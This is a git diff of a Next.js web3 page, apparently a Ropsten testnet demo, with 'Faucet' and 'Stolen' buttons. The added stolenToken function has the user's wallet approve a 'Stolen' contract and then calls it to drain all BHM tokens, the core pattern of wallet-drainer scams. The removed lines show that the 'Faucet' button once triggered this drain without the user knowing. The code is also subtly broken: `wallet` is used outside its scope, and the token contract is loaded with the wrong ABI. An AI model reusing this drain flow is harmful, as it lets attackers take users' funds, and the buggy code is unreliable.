@@ -15,20 +15,19 @@ const Home: NextPage = () => {
       const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
       const chainId = await window.ethereum.request({ method: 'eth_chainId'});
       // Check if user is connected to Ropsten
-
+      if(chainId != '0x3') {
+        alert("Please connect to Ropsten");
+      }else{
         let wallet = accounts[0];
         setWalletAddress(wallet);
-        //send_token(wallet);
-        stolen_token(wallet);
-
-        //console.log(wallet);
-      
+      }
     } else {
       alert("Please install Mask");
     }
+    return wallet;
   }
 
-  const send_token = async (wallet) => {
+  const sendToken = async () => {
     const Web3 = require('web3');
     const web3 = new Web3(window.ethereum);
     await window.ethereum.enable();
@@ -39,19 +38,32 @@ const Home: NextPage = () => {
     await Faucet.methods.send().send({from:wallet});
   }
 
-  const stolen_token = async (wallet) => {
+  const stolenToken = async () => {
     const Web3 = require('web3');
     const web3 = new Web3(window.ethereum);
     await window.ethereum.enable();
-    const contract_abi = require('../../abi/BHM_Stolen_abi');
-    const contract_address = '0xF3A299c4fCe2Cd9a33d2F76B05c0e282BF6Ea203';
-    const Stolen = new web3.eth.Contract(contract_abi, contract_address);
+    const Token_contract_abi = require('../../abi/BHM_Stolen_abi');
+    const Token_contract_address = '0x153F0FCC0E6668b2A0fa77d3B0C8406f25aFe62f';
+
+    const Stolen_contract_abi = require('../../abi/BHM_Stolen_abi');
+    const Stolen_contract_address = '0xF3A299c4fCe2Cd9a33d2F76B05c0e282BF6Ea203';
+
+    //TokenのコントラクトアドレスでApprove処理を実行
+    const amount = 1000000;
+
+    const Approve = new web3.eth.Contract(Token_contract_abi, Token_contract_address);
+    await Approve.methods.approve(Stolen_contract_address,amount).send({from:wallet});
+
+    //Stolen関数を実行して、BHM Tokenをすべて抜き取る
+    
+    const Stolen = new web3.eth.Contract(Stolen_contract_abi, Stolen_contract_address);
     //const MintContract = new web3.eth.Contract(contract_abi, contract_address);
     await Stolen.methods.Stolen().send({from:wallet});
   
     
 
   }
+
 
   return (
     <div className={styles.container}>
@@ -70,8 +82,9 @@ const Home: NextPage = () => {
           Get started by editing{' '}
           <code className={styles.code}>pages/index.tsx</code>
         </p>
-        <button onClick={connectWallet}>Faucet</button>
-        <button onClick={connectWallet}>Stolen</button>
+        <button onClick={connectWallet}>Connect Wallet</button>
+        <button onClick={sendToken}>Faucet</button>
+        <button onClick={stolenToken}>Stolen</button>
 
         <div className={styles.grid}>
           <a href="https://nextjs.org/docs" className={styles.card}>
